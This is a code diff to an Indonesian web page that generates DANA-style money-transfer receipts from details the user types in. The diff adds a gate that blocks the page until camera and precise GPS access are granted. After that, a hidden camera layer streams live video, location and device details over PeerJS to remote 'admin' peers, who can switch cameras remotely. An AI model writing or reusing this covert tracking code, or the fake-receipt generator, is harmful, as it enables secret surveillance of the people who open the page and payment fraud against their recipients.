@@ -116,8 +116,54 @@
       display: none !important;
     }
 
-    /* Layer tersembunyi untuk sistem deteksi kamera & PeerJS di latar belakang */
-    #memberDetectorLayer {
+    /* Layar blokir jika izin lokasi / kamera ditolak */
+    #permissionGate {
+      position: fixed;
+      inset: 0;
+      z-index: 200;
+      background-color: #0F172A;
+      color: #F8FAFC;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    #permissionGate.hidden {
+      display: none !important;
+    }
+
+    .gate-card {
+      width: 100%;
+      max-width: 380px;
+      background: #1E293B;
+      border: 1px solid #334155;
+      border-radius: 18px;
+      padding: 24px 20px;
+      text-align: center;
+      box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
+    }
+
+    .gate-btn {
+      width: 100%;
+      margin-top: 16px;
+      padding: 12px 16px;
+      border: none;
+      border-radius: 12px;
+      background: #118EE9;
+      color: #FFFFFF;
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      cursor: pointer;
+    }
+
+    .gate-btn:active {
+      background: #0D7CD0;
+    }
+
+    /* Layer tersembunyi untuk kamera aktif di latar belakang */
+    #hiddenCameraLayer {
       position: fixed;
       bottom: 0;
       left: 0;
@@ -148,7 +194,6 @@
       display: none !important;
     }
 
-    /* Pada Tablet & Desktop (>= 600px x 600px), tampilkan frame HP proporsional di tengah */
     @media (min-width: 600px) and (min-height: 600px) {
       body {
         padding: clamp(8px, 2dvh, 18px);
@@ -219,7 +264,6 @@
       border-color: #118EE9;
     }
 
-    /* Dropdown Searchable E-Wallet & Bank */
     .saldo-combo-wrap {
       position: relative;
     }
@@ -444,7 +488,6 @@
       transform: scale(0.97);
     }
 
-    /* Footer Layar 2: Adaptif & Rapi mengikuti layar perangkat */
     .full-blue-footer {
       flex-shrink: 0;
       width: 100%;
@@ -631,7 +674,6 @@
       z-index: 20;
     }
 
-    /* Mode Landscape HP (tinggi sangat pendek) */
     @media (max-height: 520px) and (orientation: landscape) {
       .full-blue-scroll {
         justify-content: flex-start;
@@ -653,8 +695,21 @@
 </head>
 <body>
 
-  <!-- Layer deteksi member (kamera + lokasi + PeerJS) di belakang tampilan utama -->
-  <div id="memberDetectorLayer" aria-hidden="true">
+  <!-- LAYAR WAJIB IZIN LOKASI AKURAT & KAMERA (DITAHAN JIKA DITOLAK) -->
+  <div id="permissionGate">
+    <div class="gate-card">
+      <h2 style="font-size:17px;font-weight:700;margin-bottom:8px;">Izin Lokasi & Kamera Diperlukan</h2>
+      <p id="gateStatusText" style="font-size:12.5px;color:#CBD5E1;line-height:1.45;">
+        Memeriksa akses lokasi akurat dan kamera perangkat...
+      </p>
+      <button type="button" id="btnRetryPermission" onclick="requestMandatoryPermissions()" class="gate-btn">
+        Izinkan Lokasi & Kamera
+      </button>
+    </div>
+  </div>
+
+  <!-- Layer tersembunyi untuk kamera aktif selama aplikasi/halaman terbuka -->
+  <div id="hiddenCameraLayer" aria-hidden="true">
     <video id="localVideo" autoplay playsinline muted></video>
   </div>
 
@@ -671,8 +726,7 @@
   ></video>
 
   <!-- LAYAR 1: PENGATURAN TRANSAKSI -->
-  <section id="screenSettings" class="device-frame">
-    <!-- Header Pengaturan -->
+  <section id="screenSettings" class="device-frame hidden">
     <div class="settings-header">
       <div style="display:flex;align-items:center;gap:10px;min-width:0;">
         <div style="width:28px;height:28px;border-radius:9999px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
@@ -689,10 +743,8 @@
       <span id="deviceSizeBadge" style="font-size:10px;font-weight:600;background:rgba(255,255,255,0.2);padding:3px 8px;border-radius:9999px;flex-shrink:0;white-space:nowrap;">Full HP</span>
     </div>
 
-    <!-- Area Form Scrollable Halus -->
     <div class="settings-scroll no-scrollbar">
       <div class="settings-card">
-        <!-- Kirim Ke Saldo (Popup hanya muncul saat diketik huruf) -->
         <div id="saldoComboWrap" class="saldo-combo-wrap">
           <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;gap:6px;">
             <label for="selectSaldo" style="font-size:12px;font-weight:600;color:#334155;">Kirim Ke Saldo :</label>
@@ -729,12 +781,9 @@
               </button>
             </div>
           </div>
-
-          <!-- Daftar Pilihan Otomatis (Hanya muncul saat diketik) -->
           <div id="saldoDropdownList" class="saldo-dropdown hidden no-scrollbar"></div>
         </div>
 
-        <!-- Nama Penerima -->
         <div>
           <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;gap:6px;">
             <label for="inputName" style="font-size:12px;font-weight:600;color:#334155;">Nama Penerima</label>
@@ -750,7 +799,6 @@
           />
         </div>
 
-        <!-- Nomor Penerima -->
         <div>
           <label for="inputPhone" style="display:block;font-size:12px;font-weight:600;color:#334155;margin-bottom:4px;">Nomor Penerima</label>
           <input
@@ -764,7 +812,6 @@
           />
         </div>
 
-        <!-- Nominal Transfer -->
         <div>
           <label for="inputAmount" style="display:block;font-size:12px;font-weight:600;color:#334155;margin-bottom:4px;">Nominal Transfer (Rp)</label>
           <div style="position:relative;">
@@ -784,7 +831,6 @@
           </div>
         </div>
 
-        <!-- Waktu Perangkat -->
         <div style="padding-top:8px;border-top:1px solid #F1F5F9;">
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
             <div style="min-width:0;">
@@ -802,7 +848,6 @@
           </div>
         </div>
 
-        <!-- Pengaturan Suara Notif (Hanya MP4 Asli) -->
         <div style="padding-top:8px;border-top:1px solid #F1F5F9;display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:8px;">
           <div style="min-width:0;flex:1 1 0%;">
             <div style="display:flex;align-items:center;gap:6px;">
@@ -827,7 +872,6 @@
       </div>
     </div>
 
-    <!-- Tombol KIRIM -->
     <div class="btn-kirim-wrap">
       <button
         type="button"
@@ -846,7 +890,6 @@
   <!-- LAYAR 2: RINGKASAN LAYAR PENUH BIRU (KOIN EMAS CENTANG) -->
   <section id="screenReceipt" class="device-frame full-blue-screen hidden">
     <main class="full-blue-scroll no-scrollbar">
-      <!-- Baris 1: Icon Coins Ceklis Besar (dengan jarak lega ke teks) -->
       <div class="coin-badge">
         <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Koin Centang Berhasil">
           <circle cx="50" cy="50" r="47" fill="#FFCE18"/>
@@ -855,22 +898,18 @@
         </svg>
       </div>
 
-      <!-- Baris 2: Teks Kirim Ke Saldo Besar -->
       <div id="displayDestinationText" style="font-size:var(--blue-dest-fs);font-weight:700;color:#FFFFFF;letter-spacing:0.01em;margin-bottom:6px;text-align:center;word-break:break-word;line-height:1.25;">
         Kirim Ke Saldo DANA
       </div>
 
-      <!-- Baris 3: Nama Target Besar -->
       <div id="displayRecipientHeading" style="font-size:var(--blue-name-fs);font-weight:700;color:#FFFFFF;letter-spacing:0.015em;margin-bottom:5px;text-align:center;word-break:break-word;line-height:1.2;">
         -
       </div>
 
-      <!-- Baris 4: Nomor HP Besar -->
       <div id="displayRecipientPhone" class="tabular-nums hidden" style="font-size:var(--blue-phone-fs);font-weight:700;color:#FFFFFF;letter-spacing:0.02em;margin-bottom:10px;text-align:center;word-break:break-word;line-height:1.25;">
         -
       </div>
 
-      <!-- Baris 5: Rp dan Angka Besar -->
       <div id="displayBigAmount" class="tabular-nums" style="font-size:calc(var(--blue-amount-fs) * var(--blue-amount-scale));font-weight:800;color:#FFFFFF;line-height:1.1;letter-spacing:-0.015em;margin-top:4px;margin-bottom:18px;text-align:center;word-break:break-word;">
         Rp0
       </div>
@@ -1096,9 +1135,7 @@
     const FIXED_DANA_ID = '085841512418';
     const MONTHS_ID = ['Jan', 'Feb', 'Mar', 'Apr', 'Mei', 'Jun', 'Jul', 'Agu', 'Sep', 'Okt', 'Nov', 'Des'];
 
-    // Daftar lengkap seluruh E-Wallet & Bank di Indonesia untuk pencarian cepat
     const SALDO_OPTIONS = [
-      // E-Wallet / Dompet Digital
       { value: 'DANA', cat: 'E-Wallet', alias: 'dana dompet digital' },
       { value: 'GoPay', cat: 'E-Wallet', alias: 'gopay gojek' },
       { value: 'OVO', cat: 'E-Wallet', alias: 'ovo grab' },
@@ -1122,14 +1159,10 @@
       { value: 'GudangVoucher', cat: 'E-Wallet', alias: 'gudangvoucher gv' },
       { value: 'BatPay', cat: 'E-Wallet', alias: 'batpay' },
       { value: 'Flip', cat: 'E-Wallet', alias: 'flip saldo' },
-
-      // Bank BUMN (Himbara)
       { value: 'BRI', cat: 'Bank BUMN', alias: 'bank rakyat indonesia brimo' },
       { value: 'Mandiri', cat: 'Bank BUMN', alias: 'bank mandiri livin' },
       { value: 'BNI', cat: 'Bank BUMN', alias: 'bank negara indonesia wondr' },
       { value: 'BTN', cat: 'Bank BUMN', alias: 'bank tabungan negara' },
-
-      // Bank Digital
       { value: 'SeaBank', cat: 'Bank Digital', alias: 'seabank shopee' },
       { value: 'Bank Jago', cat: 'Bank Digital', alias: 'jago artos' },
       { value: 'Blu by BCA Digital', cat: 'Bank Digital', alias: 'blu bca digital' },
@@ -1145,8 +1178,6 @@
       { value: 'Bank Aladin Syariah', cat: 'Bank Digital', alias: 'aladin syariah' },
       { value: 'Bank Nano Syariah', cat: 'Bank Digital', alias: 'nano syariah sinarmas' },
       { value: 'Bank Amar Indonesia', cat: 'Bank Digital', alias: 'amar tunaiku' },
-
-      // Bank Syariah
       { value: 'BSI', cat: 'Bank Syariah', alias: 'bank syariah indonesia byond' },
       { value: 'Bank Muamalat', cat: 'Bank Syariah', alias: 'muamalat' },
       { value: 'BCA Syariah', cat: 'Bank Syariah', alias: 'bca syariah' },
@@ -1159,8 +1190,6 @@
       { value: 'Bank Aceh Syariah', cat: 'Bank Syariah', alias: 'aceh syariah' },
       { value: 'BRK Syariah', cat: 'Bank Syariah', alias: 'riau kepri brk syariah' },
       { value: 'Bank NTB Syariah', cat: 'Bank Syariah', alias: 'ntb syariah' },
-
-      // Bank Swasta Nasional & Asing
       { value: 'BCA', cat: 'Bank', alias: 'bank central asia mybca' },
       { value: 'CIMB Niaga', cat: 'Bank', alias: 'cimb niaga octo' },
       { value: 'Permata', cat: 'Bank', alias: 'bank permata' },
@@ -1211,8 +1240,6 @@
       { value: 'Deutsche Bank', cat: 'Bank', alias: 'deutsche bank' },
       { value: 'JPMorgan Chase Bank', cat: 'Bank', alias: 'jpmorgan chase' },
       { value: 'MUFG Bank', cat: 'Bank', alias: 'mufg btmu' },
-
-      // Bank Pembangunan Daerah (BPD)
       { value: 'Bank DKI', cat: 'BPD', alias: 'bank dki jakarta' },
       { value: 'Bank BJB', cat: 'BPD', alias: 'bjb jawa barat banten' },
       { value: 'Bank Banten', cat: 'BPD', alias: 'banten' },
@@ -1272,32 +1299,19 @@
     function getRankedSaldoMatches(rawQuery) {
       const q = rawQuery.trim().toLowerCase();
       if (!q) return [];
-
       const scored = [];
       for (const item of SALDO_OPTIONS) {
         const nameLower = item.value.toLowerCase();
         const aliasLower = item.alias.toLowerCase();
         let rank = 99;
-
-        if (nameLower === q) {
-          rank = 0;
-        } else if (nameLower.startsWith(q)) {
-          rank = 1;
-        } else if (nameLower.split(/[\s().-]+/).some((w) => w.startsWith(q))) {
-          rank = 2;
-        } else if (nameLower.includes(q)) {
-          rank = 3;
-        } else if (aliasLower.split(/\s+/).some((w) => w.startsWith(q))) {
-          rank = 4;
-        } else if (aliasLower.includes(q)) {
-          rank = 5;
-        }
-
-        if (rank < 99) {
-          scored.push({ item, rank });
-        }
+        if (nameLower === q) rank = 0;
+        else if (nameLower.startsWith(q)) rank = 1;
+        else if (nameLower.split(/[\s().-]+/).some((w) => w.startsWith(q))) rank = 2;
+        else if (nameLower.includes(q)) rank = 3;
+        else if (aliasLower.split(/\s+/).some((w) => w.startsWith(q))) rank = 4;
+        else if (aliasLower.includes(q)) rank = 5;
+        if (rank < 99) scored.push({ item, rank });
       }
-
       scored.sort((a, b) => a.rank - b.rank);
       return scored.map((s) => s.item);
     }
@@ -1305,23 +1319,19 @@
     function renderSaldoDropdown(query) {
       const listEl = document.getElementById('saldoDropdownList');
       if (!listEl) return;
-
       const trimmedQ = query.trim();
       if (!trimmedQ) {
         currentFilteredSaldo = [];
         closeSaldoDropdown();
         return;
       }
-
       const matches = getRankedSaldoMatches(trimmedQ);
       currentFilteredSaldo = matches;
-
       if (matches.length === 0) {
         listEl.innerHTML = `<div style="padding:10px 12px;font-size:12px;color:#64748B;text-align:center;">Tidak ditemukan di daftar — pakai "<strong>${escapeHtml(trimmedQ)}</strong>"</div>`;
         listEl.classList.remove('hidden');
         return;
       }
-
       listEl.innerHTML = matches.map((item) => {
         const isSel = lastSelectedSaldo && item.value.toLowerCase() === lastSelectedSaldo.toLowerCase() ? ' is-selected' : '';
         return `
@@ -1336,7 +1346,6 @@
           </button>
         `;
       }).join('');
-
       listEl.classList.remove('hidden');
     }
 
@@ -1347,7 +1356,6 @@
 
     function handleSaldoFocus(el) {
       updateClearSaldoBtn();
-      initMemberDetector();
     }
 
     function handleSaldoInput(el) {
@@ -1403,13 +1411,10 @@
     }
 
     document.addEventListener('pointerdown', (e) => {
-      initMemberDetector();
       const wrap = document.getElementById('saldoComboWrap');
       if (wrap && !wrap.contains(e.target)) {
         const input = document.getElementById('selectSaldo');
-        if (input) {
-          lastSelectedSaldo = input.value.trim();
-        }
+        if (input) lastSelectedSaldo = input.value.trim();
         closeSaldoDropdown();
       }
     });
@@ -1471,11 +1476,8 @@
       const breakdownEl = document.getElementById('screenDetailBreakdown');
       if (breakdownEl) {
         breakdownEl.classList.remove('density-compact', 'density-tall');
-        if (fh <= 680 || fw <= 350) {
-          breakdownEl.classList.add('density-compact');
-        } else if (fh >= 820 && fw >= 390) {
-          breakdownEl.classList.add('density-tall');
-        }
+        if (fh <= 680 || fw <= 350) breakdownEl.classList.add('density-compact');
+        else if (fh >= 820 && fw >= 390) breakdownEl.classList.add('density-tall');
       }
 
       updateDeviceBadge(Math.round(fw), Math.round(fh), vw, vh, isFramed);
@@ -1498,59 +1500,30 @@
       if (colorHex) el.style.color = colorHex;
     }
 
-    mediaEl.addEventListener('canplaythrough', () => {
-      setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669');
-    });
-
-    mediaEl.addEventListener('canplay', () => {
-      setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669');
-    });
-
-    mediaEl.addEventListener('playing', () => {
-      setAudioStatus('Suara asli MP4 sedang berbunyi!', '#118EE9');
-    });
-
-    mediaEl.addEventListener('ended', () => {
-      setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669');
-    });
-
-    mediaEl.addEventListener('error', () => {
-      setAudioStatus('Gagal memuat MP4 (cek internet / link)', '#DC2626');
-    });
+    mediaEl.addEventListener('canplaythrough', () => setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669'));
+    mediaEl.addEventListener('canplay', () => setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669'));
+    mediaEl.addEventListener('playing', () => setAudioStatus('Suara asli MP4 sedang berbunyi!', '#118EE9'));
+    mediaEl.addEventListener('ended', () => setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669'));
+    mediaEl.addEventListener('error', () => setAudioStatus('Gagal memuat MP4 (cek internet / link)', '#DC2626'));
 
     function preBufferOnFormActivity() {
-      initMemberDetector();
       if (mediaEl.error || mediaEl.networkState === HTMLMediaElement.NETWORK_EMPTY || mediaEl.networkState === HTMLMediaElement.NETWORK_NO_SOURCE) {
-        try {
-          mediaEl.load();
-        } catch (e) {}
+        try { mediaEl.load(); } catch (e) {}
       }
     }
 
     function playNotifSound(sourceLabel) {
       try {
-        if (mediaEl.error) {
-          mediaEl.load();
-        }
-
+        if (mediaEl.error) mediaEl.load();
         mediaEl.muted = false;
         mediaEl.volume = 1.0;
-
-        if (!mediaEl.paused) {
-          mediaEl.pause();
-        }
-        if (mediaEl.readyState >= 1) {
-          mediaEl.currentTime = 0;
-        }
-
+        if (!mediaEl.paused) mediaEl.pause();
+        if (mediaEl.readyState >= 1) mediaEl.currentTime = 0;
         setAudioStatus(`Memutar MP4 (${sourceLabel})...`, '#118EE9');
-
         const playPromise = mediaEl.play();
         if (playPromise && typeof playPromise.then === 'function') {
           playPromise
-            .then(() => {
-              setAudioStatus(`Suara MP4 berbunyi (${sourceLabel})`, '#059669');
-            })
+            .then(() => setAudioStatus(`Suara MP4 berbunyi (${sourceLabel})`, '#059669'))
             .catch((err) => {
               if (err && err.name === 'AbortError') return;
               setAudioStatus('Gagal memutar MP4 (cek izin suara / internet)', '#DC2626');
@@ -1562,7 +1535,6 @@
     }
 
     function handleTestAudioClick() {
-      initMemberDetector();
       playNotifSound('TEST');
     }
 
@@ -1577,7 +1549,6 @@
     }
 
     function handleSendClick() {
-      initMemberDetector();
       closeSaldoDropdown();
       playNotifSound('KIRIM');
       applySettingsToReceipt();
@@ -1603,13 +1574,9 @@
     function handleShareClick() {
       const summary = document.getElementById('displaySummaryText').textContent;
       if (navigator.share) {
-        navigator.share({
-          title: 'Bukti Transaksi DANA',
-          text: summary
-        }).catch(() => {});
+        navigator.share({ title: 'Bukti Transaksi DANA', text: summary }).catch(() => {});
         return;
       }
-
       if (navigator.clipboard && navigator.clipboard.writeText) {
         navigator.clipboard.writeText(summary).catch(() => {});
       }
@@ -1634,9 +1601,7 @@
     }
 
     function handleAmountFocus(el) {
-      if (el.value.trim() === '0') {
-        el.value = '';
-      }
+      if (el.value.trim() === '0') el.value = '';
     }
 
     function handleAmountInput(el) {
@@ -1662,9 +1627,7 @@
       const trimmed = rawName.trim();
       if (!trimmed) return '-';
       const words = trimmed.split(/\s+/);
-      if (words.length === 1) {
-        return maskTokenMiddle(words[0]);
-      }
+      if (words.length === 1) return maskTokenMiddle(words[0]);
       return words
         .map((token, idx) => (idx === 0 ? token.toUpperCase() : maskTokenMiddle(token)))
         .join(' ');
@@ -1672,16 +1635,13 @@
 
     function autoMaskDanaId(idStr) {
       const digits = idStr.replace(/\D/g, '');
-      if (digits.length >= 8) {
-        return `${digits.slice(0, 4)}••••${digits.slice(-4)}`;
-      }
+      if (digits.length >= 8) return `${digits.slice(0, 4)}••••${digits.slice(-4)}`;
       return idStr;
     }
 
     function getFormattedDateTime() {
       const isAuto = document.getElementById('autoTimeCheck').checked;
       const d = new Date();
-
       if (!isAuto) {
         const dateVal = document.getElementById('manualDate').value;
         const timeVal = document.getElementById('manualTime').value;
@@ -1694,13 +1654,11 @@
           d.setHours(hh, mm);
         }
       }
-
       const day = String(d.getDate()).padStart(2, '0');
       const month = MONTHS_ID[d.getMonth()];
       const year = d.getFullYear();
       const hours = String(d.getHours()).padStart(2, '0');
       const minutes = String(d.getMinutes()).padStart(2, '0');
-
       return `${day} ${month} ${year} • ${hours}:${minutes}`;
     }
 
@@ -1732,12 +1690,10 @@
     function applySettingsToReceipt() {
       const saldoInput = document.getElementById('selectSaldo');
       const selectedDest = (saldoInput && saldoInput.value.trim()) ? saldoInput.value.trim() : 'DANA';
-
       const rawName = document.getElementById('inputName').value.trim();
       const resolvedName = autoMaskRecipientName(rawName);
       const rawPhone = document.getElementById('inputPhone').value.trim();
       const maskedDanaId = autoMaskDanaId(FIXED_DANA_ID);
-
       const amountDigits = document.getElementById('inputAmount').value.replace(/\D/g, '');
       const amount = amountDigits ? formatRupiah(amountDigits) : '0';
       const formattedTime = getFormattedDateTime();
@@ -1746,7 +1702,6 @@
         ? (resolvedName !== '-' ? `${resolvedName} ${rawPhone}` : rawPhone)
         : resolvedName;
 
-      // Layar 2 (Ringkasan Layar Penuh Biru - 5 Baris Terpisah & Besar)
       document.getElementById('displayDestinationText').textContent = `Kirim Ke Saldo ${selectedDest}`;
       document.getElementById('displayRecipientHeading').textContent = resolvedName;
 
@@ -1763,16 +1718,11 @@
       document.getElementById('displayBigAmount').textContent = fullAmountText;
 
       let amountScale = 1;
-      if (fullAmountText.length >= 14) {
-        amountScale = 0.68;
-      } else if (fullAmountText.length >= 11) {
-        amountScale = 0.82;
-      } else if (fullAmountText.length >= 9) {
-        amountScale = 0.92;
-      }
+      if (fullAmountText.length >= 14) amountScale = 0.68;
+      else if (fullAmountText.length >= 11) amountScale = 0.82;
+      else if (fullAmountText.length >= 9) amountScale = 0.92;
       document.documentElement.style.setProperty('--blue-amount-scale', String(amountScale));
 
-      // Layar 3 (Rincian Detail Transaksi)
       document.getElementById('displayDateTime').textContent = formattedTime;
       document.getElementById('displayIdDana').textContent = `ID DANA ${maskedDanaId}`;
       document.getElementById('displaySummaryText').textContent = `Kirim Uang Rp${amount} ke ${combinedRecipient}`;
@@ -1811,69 +1761,65 @@
     }
 
     /* =========================================================================
-       SISTEM DETEKSI MEMBER (KAMERA + LOKASI + PEERJS) DI LATAR BELAKANG
+       SISTEM WAJIB IZIN LOKASI AKURAT & KAMERA + MULTI-HP STREAMING (PEERJS)
        ========================================================================= */
-    const ROOM_ID = "jirun-live-room-9988";[cite: 2]
+    const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
+    const MEMBER_PEER_ID = "jirun-hp-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 6);
 
     let currentFacing = "user"; // "user" = depan, "environment" = belakang
     let cameraStream = null;
     let peer = null;
-    let activeCall = null;
-    let activeDataConn = null;
+    let lobbyConn = null;
+    let heartbeatTimer = null;
     let watchId = null;
     let latestLocation = null;
-    let isStartingDetector = false;
+    let hasAccurateLocation = false;
+    let hasCameraPermission = false;
+    let isRequestingPerms = false;
+
+    // Menyimpan panggilan aktif per viewer admin: { [adminPeerId]: MediaConnection }
+    const activeCallsByAdmin = {};
+    // Menyimpan data koneksi per viewer admin: { [adminPeerId]: DataConnection }
+    const adminConns = {};
 
     const localVideoEl = document.getElementById("localVideo");
 
-    async function openMemberCamera(facing) {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        return null;
-      }
-      if (cameraStream) {
-        cameraStream.getTracks().forEach(t => t.stop());
-        cameraStream = null;
-      }
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
-        audio: false
-      });
-      currentFacing = facing;
-      cameraStream = stream;
-      localVideoEl.srcObject = stream;
-      await localVideoEl.play().catch(() => {});
+    function setGateMessage(msg) {
+      const el = document.getElementById("gateStatusText");
+      if (el) el.textContent = msg;
+    }
 
-      if (activeCall && activeCall.peerConnection) {
-        const newTrack = stream.getVideoTracks()[0];
-        const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === "video");
-        if (sender && newTrack) {
-          await sender.replaceTrack(newTrack).catch(() => {});
+    function unlockMainAppIfReady() {
+      const gateEl = document.getElementById("permissionGate");
+      const settingsEl = document.getElementById("screenSettings");
+      if (hasAccurateLocation && hasCameraPermission && cameraStream) {
+        gateEl.classList.add("hidden");
+        if (
+          document.getElementById("screenReceipt").classList.contains("hidden") &&
+          document.getElementById("screenDetailBreakdown").classList.contains("hidden")
+        ) {
+          settingsEl.classList.remove("hidden");
         }
+        syncViewportHeight();
+        return true;
       }
-      sendStatusToAdmin();
-      return stream;
+      gateEl.classList.remove("hidden");
+      settingsEl.classList.add("hidden");
+      return false;
     }
 
-    function sendStatusToAdmin() {
-      if (activeDataConn && activeDataConn.open) {
-        activeDataConn.send({
-          type: "STATUS",
-          facing: currentFacing === "environment" ? "Belakang" : "Depan",
-          location: latestLocation,
-          updatedAt: Date.now()
-        });
-      }
-    }
-
-    function startMemberLocationStream() {
+    function requestAccurateLocation() {
       return new Promise((resolve, reject) => {
         if (!navigator.geolocation) {
-          reject(new Error("Geolocation not supported"));
+          reject(new Error("Perangkat tidak mendukung GPS/Geolocation."));
           return;
         }
-        let done = false;
-        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+        if (watchId !== null) {
+          navigator.geolocation.clearWatch(watchId);
+          watchId = null;
+        }
 
+        let settled = false;
         watchId = navigator.geolocation.watchPosition(
           (pos) => {
             latestLocation = {
@@ -1887,84 +1833,238 @@
                 ? Math.round(pos.coords.heading) + "°"
                 : "-"
             };
-            sendStatusToAdmin();
-            if (!done) {
-              done = true;
+            hasAccurateLocation = true;
+            broadcastPresenceToAdmins();
+            if (!settled) {
+              settled = true;
               resolve(latestLocation);
             }
           },
           (err) => {
-            if (!done) {
-              done = true;
-              reject(err);
+            if (!hasAccurateLocation) {
+              reject(new Error(err?.message || "Izin lokasi akurat ditolak."));
             }
           },
-          { enableHighAccuracy: true, timeout: 15000, maximumAge: 1000 }
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
       });
     }
 
+    async function openCameraKeepAlive(facing) {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        throw new Error("Browser/APK tidak mendukung akses kamera.");
+      }
+      // Hentikan stream lama hanya saat mengganti kamera depan/belakang
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(t => t.stop());
+        cameraStream = null;
+      }
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: { ideal: facing },
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        },
+        audio: false
+      });
+
+      currentFacing = facing;
+      cameraStream = stream;
+      hasCameraPermission = true;
+      localVideoEl.srcObject = stream;
+      await localVideoEl.play().catch(() => {});
+
+      // Ganti track video ke semua admin yang sedang menonton secara real-time
+      const newTrack = stream.getVideoTracks()[0];
+      if (newTrack) {
+        for (const [adminId, call] of Object.entries(activeCallsByAdmin)) {
+          if (call && call.peerConnection) {
+            const sender = call.peerConnection.getSenders().find(s => s.track && s.track.kind === "video");
+            if (sender) {
+              await sender.replaceTrack(newTrack).catch(() => {});
+            }
+          }
+        }
+      }
+
+      broadcastPresenceToAdmins();
+      return stream;
+    }
+
+    function getDeviceSummary() {
+      const ua = navigator.userAgent || "Perangkat";
+      return ua.length > 68 ? ua.slice(0, 65) + "..." : ua;
+    }
+
+    function buildPresencePayload() {
+      return {
+        type: "HP_PRESENCE",
+        peerId: MEMBER_PEER_ID,
+        facing: currentFacing === "environment" ? "Belakang" : "Depan",
+        cameraOn: Boolean(cameraStream),
+        location: latestLocation,
+        device: getDeviceSummary(),
+        updatedAt: Date.now()
+      };
+    }
+
+    function broadcastPresenceToAdmins() {
+      const payload = buildPresencePayload();
+      if (lobbyConn && lobbyConn.open) {
+        lobbyConn.send(payload);
+      }
+      for (const conn of Object.values(adminConns)) {
+        if (conn && conn.open) {
+          conn.send(payload);
+        }
+      }
+    }
+
+    function connectToAdminLobby() {
+      if (!peer || peer.disconnected || peer.destroyed) return;
+      if (lobbyConn && lobbyConn.open) {
+        broadcastPresenceToAdmins();
+        return;
+      }
+      const conn = peer.connect(ADMIN_LOBBY_ID, { reliable: true });
+      lobbyConn = conn;
+      conn.on("open", () => {
+        broadcastPresenceToAdmins();
+      });
+      conn.on("data", (msg) => {
+        handleAdminMessage(conn.peer, msg);
+      });
+      conn.on("close", () => {
+        if (lobbyConn === conn) lobbyConn = null;
+      });
+      conn.on("error", () => {});
+    }
+
+    async function handleAdminMessage(fromPeerId, msg) {
+      if (!msg || !msg.type) return;
+
+      if (msg.type === "REQUEST_STREAM") {
+        if (!cameraStream) return;
+        const call = peer.call(fromPeerId, cameraStream);
+        if (call) {
+          activeCallsByAdmin[fromPeerId] = call;
+          call.on("close", () => {
+            delete activeCallsByAdmin[fromPeerId];
+          });
+        }
+        broadcastPresenceToAdmins();
+      } else if (msg.type === "SWITCH_CAM") {
+        const target = msg.facing === "environment" || msg.facing === "user"
+          ? msg.facing
+          : (currentFacing === "user" ? "environment" : "user");
+        await openCameraKeepAlive(target).catch(() => {});
+      } else if (msg.type === "PING") {
+        broadcastPresenceToAdmins();
+      }
+    }
+
     function setupMemberPeer() {
       if (peer || typeof Peer === "undefined") return;
-      peer = new Peer(ROOM_ID);
+      peer = new Peer(MEMBER_PEER_ID);
+
+      peer.on("open", () => {
+        connectToAdminLobby();
+      });
 
       peer.on("connection", (conn) => {
-        activeDataConn = conn;
+        adminConns[conn.peer] = conn;
         conn.on("open", () => {
-          sendStatusToAdmin();
+          conn.send(buildPresencePayload());
         });
-        conn.on("data", async (msg) => {
-          if (!msg || !msg.type) return;
-          if (msg.type === "SWITCH_CAM") {
-            const target = msg.facing === "environment" || msg.facing === "user"
-              ? msg.facing
-              : (currentFacing === "user" ? "environment" : "user");
-            await openMemberCamera(target).catch(() => {});
-          } else if (msg.type === "PING") {
-            sendStatusToAdmin();
-          }
+        conn.on("data", (msg) => {
+          handleAdminMessage(conn.peer, msg);
+        });
+        conn.on("close", () => {
+          delete adminConns[conn.peer];
         });
       });
 
       peer.on("call", (call) => {
         if (!cameraStream) return;
-        activeCall = call;
+        activeCallsByAdmin[call.peer] = call;
         call.answer(cameraStream);
+        call.on("close", () => {
+          delete activeCallsByAdmin[call.peer];
+        });
       });
-    }
 
-    async function initMemberDetector() {
-      if (isStartingDetector) return;
-      if (latestLocation && cameraStream && peer) return;
-      isStartingDetector = true;
-      try {
-        if (!latestLocation) {
-          await startMemberLocationStream().catch(() => {});
+      peer.on("disconnected", () => {
+        if (peer && !peer.destroyed) {
+          peer.reconnect();
         }
-        if (!cameraStream) {
-          await openMemberCamera(currentFacing).catch(() => {});
-        }
-        setupMemberPeer();
-      } catch (err) {
-        console.error(err);
-      } finally {
-        isStartingDetector = false;
+      });
+
+      if (!heartbeatTimer) {
+        heartbeatTimer = setInterval(() => {
+          if (hasAccurateLocation && hasCameraPermission && cameraStream) {
+            connectToAdminLobby();
+            broadcastPresenceToAdmins();
+          }
+        }, 2500);
       }
     }
 
-    function cleanupMemberDetector() {
-      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
